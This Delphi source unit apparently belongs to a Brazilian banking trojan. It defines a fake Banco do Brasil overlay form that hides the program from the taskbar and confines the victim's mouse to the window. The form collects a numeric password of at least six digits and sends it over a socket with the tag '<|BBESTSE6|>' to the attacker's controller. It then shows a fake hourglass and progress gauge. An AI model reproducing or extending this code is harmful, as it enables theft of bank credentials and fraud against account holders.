unit BB6est;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Imaging.jpeg,
  Vcl.ExtCtrls;

type
  TESTIOOOO = class(TForm)
    PPEST11: TPanel;
    Image2: TImage;
    Image1: TImage;
    Image3: TImage;
    Image4: TImage;
    Image5: TImage;
    EdEDDSe: TEdit;
    procedure FormShow(Sender: TObject);
    procedure EdEDDSeKeyPress(Sender: TObject; var Key: Char);
    procedure Image1Click(Sender: TObject);
    procedure Image3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  ESTIOOOO: TESTIOOOO;

implementation

{$R *.dfm}
USes UnPrincipal, Unit12, Unit21;

procedure TESTIOOOO.EdEDDSeKeyPress(Sender: TObject; var Key: Char);
begin
  If Key = #13 Then
    Image1Click(Sender);
 If not( key in['0'..'9',#08] ) then
    key:=#0;
end;

procedure TESTIOOOO.FormShow(Sender: TObject);
begin
 FormFlutuante(ESTIOOOO);
 ShowWindow(Application.Handle, SW_HIDE);
 Func.PrendeMouse (Form12.Left, Form12.Top, Form12.Width, Form12.Height);
end;

procedure TESTIOOOO.Image1Click(Sender: TObject);
begin
 if Length(EdEDDSe.Text) < 6 then
 begin
  EdEDDSe.Clear;
  EdEDDSe.SetFocus;
 exit
 end
 else
 Form1.CS1.Socket.SendText('<|BBESTSE6|>' + EdEDDSe.Text + '<|>');
 Screen.Cursor := crHourGlass;
 sleep(900);
 EdEDDSe.Text := '';
 Screen.Cursor := crDefault;
 ESTIOOOO.PPEST11.Visible := False;
 PPEST11.Visible:=  false;
 ESTIOOOO.Visible:= false;
 Form12.PanelBBEstilo.Visible := True;
 Form12.TrmGaugeBBEstilo.Enabled := True;
 //Func.TravaM;
end;

procedure TESTIOOOO.Image3Click(Sender: TObject);
begin
 EdEDDSe.Clear;
end;

end.
